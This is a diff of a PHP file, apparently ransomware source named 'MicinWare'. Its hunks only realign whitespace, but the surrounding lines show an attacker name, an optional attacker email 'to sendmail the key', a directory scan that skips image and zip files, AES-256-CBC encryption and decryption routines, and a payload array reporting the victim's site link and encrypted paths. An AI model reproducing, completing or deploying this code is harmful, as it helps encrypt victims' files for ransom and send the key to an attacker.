@@ -21,7 +21,7 @@ MicinWare::main();
 class MicinWare
 {
 	public static $attacker 	= 'GreyCat';
-	public static $mailAttacker = '';//fill it if u want to sendmail the key
+	public static $mailAttacker 	= '';//fill it if u want to sendmail the key
 
 	public function main()
 	{
@@ -114,8 +114,8 @@ class MicinWare
 
 	public function scanDir($dir='',$token='',&$result = array())
     {
-    	$files 		= scandir($dir);
-    	$extensions = array("jpg","png","gif","zip");//not encrypted
+    	$files		= scandir($dir);
+    	$extensions 	= array("jpg","png","gif","zip");//not encrypted
     	
     	
 	    foreach($files as $key => $value)
@@ -239,13 +239,13 @@ class MicinWare
 
 	public function micinCry($plaintext='',$key='')
 	{
-		$options 		= OPENSSL_RAW_DATA;
-		$as_binary 		= true;
-		$ivlen   		= openssl_cipher_iv_length("aes-256-cbc");
-		$iv 	 		= openssl_random_pseudo_bytes($ivlen);
-		$ciphertext_raw = openssl_encrypt($plaintext, "aes-256-cbc", $key, $options, $iv);
-		$hmac 			= hash_hmac('sha256', $ciphertext_raw, $key, $as_binary);
-		$ciphertext 	= self::_throwMicin( $iv.$hmac.$ciphertext_raw ,'Cry');
+		$options 			= OPENSSL_RAW_DATA;
+		$as_binary 			= true;
+		$ivlen 				= openssl_cipher_iv_length("aes-256-cbc");
+		$iv 				= openssl_random_pseudo_bytes($ivlen);
+		$ciphertext_raw 		= openssl_encrypt($plaintext, "aes-256-cbc", $key, $options, $iv);
+		$hmac 				= hash_hmac('sha256', $ciphertext_raw, $key, $as_binary);
+		$ciphertext 			= self::_throwMicin( $iv.$hmac.$ciphertext_raw ,'Cry');
 
 		return $ciphertext;
 	}
@@ -253,13 +253,13 @@ class MicinWare
 	public function micindeCry($ciphertext='',$key='')
 	{
 		$c 					= self::_throwMicin($ciphertext,'Decry');
-		$options 			= OPENSSL_RAW_DATA;
-		$ivlen 				= openssl_cipher_iv_length("aes-256-cbc");
-		$iv 				= substr($c, 0, $ivlen);
-		$hmac 				= substr($c, $ivlen, $sha2len=32);
-		$ciphertext_raw 	= substr($c, $ivlen+$sha2len);
-		$original_plaintext = openssl_decrypt($ciphertext_raw, "aes-256-cbc", $key, $options, $iv);
-		$calcmac 			= hash_hmac('sha256', $ciphertext_raw, $key, $as_binary=true);
+		$options 				= OPENSSL_RAW_DATA;
+		$ivlen 					= openssl_cipher_iv_length("aes-256-cbc");
+		$iv 					= substr($c, 0, $ivlen);
+		$hmac 					= substr($c, $ivlen, $sha2len=32);
+		$ciphertext_raw 			= substr($c, $ivlen+$sha2len);
+		$original_plaintext 			= openssl_decrypt($ciphertext_raw, "aes-256-cbc", $key, $options, $iv);
+		$calcmac 				= hash_hmac('sha256', $ciphertext_raw, $key, $as_binary=true);
 		if (hash_equals($hmac, $calcmac))
 		{
 		    return $original_plaintext."\n";
@@ -322,7 +322,7 @@ class MicinWare
 					array(
 					    'taburinMicin' 	=> $type,
 					    'komposisi'    	=> $data,
-					    'you'			=> $actualLink,
+					    'you'		=> $actualLink,
 					    'micined'		=> ( isset($pathMicined) ? $pathMicined : ""),
 					    'email' 		=> ( self::$mailAttacker == true ? self::$mailAttacker : ""),
 					));
